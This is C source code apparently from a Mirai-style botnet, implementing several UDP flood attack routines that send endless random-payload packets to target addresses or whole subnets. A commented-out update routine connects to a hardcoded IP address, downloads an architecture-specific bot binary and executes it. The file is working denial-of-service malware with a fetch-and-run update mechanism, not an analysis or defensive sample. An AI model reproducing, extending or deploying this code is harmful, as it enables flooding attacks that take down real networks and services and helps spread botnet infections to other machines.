#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <poll.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <pthread.h>

#include "VVV/includes.h"
#include "VVV/attack.h"
#include "VVV/checksum.h"
#include "VVV/rand.h"
#include "VVV/util.h"
#include "VVV/table.h"
#include "VVV/protocol.h"

#define MAX_THREADS 100

struct thread_data {
    int thread_id;
    int socket_fd;
    struct sockaddr_in target_addr;
    uint16_t data_len;
    BOOL data_rand;
};

void* send_udp_packets(void* thread_arg) {
    struct thread_data* data = (struct thread_data*) thread_arg;
    int socket_fd = data->socket_fd;
    struct sockaddr_in target_addr = data->target_addr;
    uint16_t data_len = data->data_len;
    BOOL data_rand = data->data_rand;

    char* packet = calloc(data_len, sizeof(char));

    while (TRUE) {
        if (data_rand)
            rand_str(packet, data_len);

        sendto(socket_fd, packet, data_len, MSG_NOSIGNAL, (struct sockaddr*) &target_addr, sizeof(struct sockaddr_in));
    }

    free(packet);
    pthread_exit(NULL);
}

void attack_udp_thread(uint8_t targs_len, struct attack_target* targs, uint8_t opts_len, struct attack_option* opts) {
#ifdef DEBUG
    printf("in udp threads\n");
#endif

    int i;
    pthread_t threads[MAX_THREADS];
    struct thread_data thread_data_array[MAX_THREADS];
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    if (sport == 0xffff) {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

#ifdef DEBUG
    printf("after args\n");
#endif

    for (i = 0; i < targs_len * 2; i++) {
        struct sockaddr_in bind_addr = {0};
        int socket_fd;

        if (dport == 0xffff)
            targs[i % targs_len].sock_addr.sin_port = rand_next();
        else
            targs[i % targs_len].sock_addr.sin_port = htons(dport);

        if ((socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = INADDR_ANY;

        if (bind(socket_fd, (struct sockaddr*) &bind_addr, sizeof(struct sockaddr_in)) == -1) {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        // For prefix attacks
        if (targs[i % targs_len].netmask < 32)
            targs[i % targs_len].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t) rand_next()) >> targs[i % targs_len].netmask));

        if (connect(socket_fd, (struct sockaddr*) &targs[i % targs_len].sock_addr, sizeof(struct sockaddr_in)) == -1) {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }

        struct thread_data* thread_data = &thread_data_array[i];
        thread_data->thread_id = i;
        thread_data->socket_fd = socket_fd;
        thread_data->target_addr = targs[i % targs_len].sock_addr;
        thread_data->data_len = data_len;
        thread_data->data_rand = data_rand;

        pthread_create(&threads[i], NULL, send_udp_packets, (void*) thread_data);
    }

#ifdef DEBUG
    printf("after setup\n");
#endif

    // Wait for threads to finish
    for (i = 0; i < targs_len * 2; i++) {
        pthread_join(threads[i], NULL);
    }
}

void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("in udp plain\n");
#endif

    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

#ifdef DEBUG
    printf("after args\n");
#endif

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

#ifdef DEBUG
    printf("after setup\n");
#endif

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

#ifdef DEBUG
            errno = 0;
            if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
            {
                printf("send failed: %d\n", errno);
            } else {
                printf(".\n");
            }
#else
            send(fds[i], data, data_len, MSG_NOSIGNAL);
#endif
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_udp_smart(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof(char *));
    int *fds = calloc(targs_len, sizeof(int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    uint8_t data_rand = (uint8_t)attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
    {
        sport = rand_next();
    }
    else
    {
        sport = htons(sport);
    }

    for (i = 0; i < targs_len; i++)
    {
        char *data;

        pkts[i] = calloc(data_len, sizeof(char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            free(pkts[i]);
            continue;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = INADDR_ANY;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
            free(pkts[i]);
            close(fds[i]);
            continue;
        }

        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
            free(pkts[i]);
            close(fds[i]);
            continue;
        }
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            
            if (data_rand)
                rand_str(data, data_len);

#ifdef DEBUG
            errno = 0;
            if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
            {
                printf("send failed: %d\n", errno);
            }
            else
            {
                printf(".\n");
            }
#else
            send(fds[i], data, data_len, MSG_NOSIGNAL);
#endif
        }
#ifdef DEBUG
        break;
        if (errno != 0)
            printf("errno = %d\n", errno);
#endif
    }

    // Free allocated memory and close sockets
    for (i = 0; i < targs_len; i++)
    {
        free(pkts[i]);
        close(fds[i]);
    }
    free(pkts);
    free(fds);
}



void update_process(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
/*
    #ifdef DEBUG
    printf("UPDATE!\n");
    #endif
   

    //char *id_buf = "dbg";
     int socket_desc;
    unsigned int header_parser = 0;
    char message[30];
    char final[100];
    char final2[100];
    char server_reply[128];
    char *filename = "updateproc";
    int total_len = 0;
    int status = 0;

    int len; 

    int file;
    struct sockaddr_in server;

    //Create socket
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
    if (socket_desc == -1)
    {
        //printf("Could not create socket");
    }

    server.sin_addr.s_addr = INET_ADDR(185,172,110,235);
    server.sin_family = AF_INET;
    server.sin_port = htons( 80 );

    //Connect to remote server
    if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        //puts("connect error");
        return;
    }

    #ifdef DEBUG
    printf("connected\n");
    #endif

    //Send request
    //message = "GET /dbg HTTP/1.0\r\n\r\n";

     file_desc = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0777);

    if (file_desc == -1)
    {
        #ifdef DEBUG
        printf("open() err\n");
        #endif
        close(socket_desc);
    }
    

    if( write(socket_desc , "GET /" ARCH " HTTP/1.0\r\n\r\n" , strlen("GET /" ARCH " HTTP/1.0\r\n\r\n")) != strlen("GET /" ARCH " HTTP/1.0\r\n\r\n"))
    {
        //printf("write failed");
        close(socket_desc);
        close(file_desc);
        return;
    }

    #ifdef DEBUG
    printf("Data Send\n"); 
    #endif

    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(socket_desc, &ch, 1);

        if (ret != 1)
        {
            close(socket_desc);
            close(file_desc);
            return;
        }

        header_parser = (header_parser << 8) | ch;
    }


    #ifdef DEBUG
    printf("finished recv http header\n");
    #endif



    while(1)
    {
        int received_len = read(socket_desc, server_reply, sizeof (server_reply));

        total_len += received_len;

        if (received_len <= 0)
            break;

        write(file_desc, server_reply, received_len);
        #ifdef DEBUG
        printf("\nReceived byte size = %d\nTotal lenght = %d", received_len, total_len);
        #endif

    }

    #ifdef DEBUG
    printf("fin.\n");
    #endif

    rename("updateproc", "bot." ARCH);

    //teardown_connection();
    int pid;
    pid = fork();
    
    if(pid == -1) // Fork error?
    {
        close(file_desc);
        return;
    }

    if(pid == 0)
    {
        execl("bot." ARCH, "update." ARCH, NULL);
        exit(0);
    }

    waitpid(pid, &status, 0);

    close(socket_desc);
    return;
*/
}
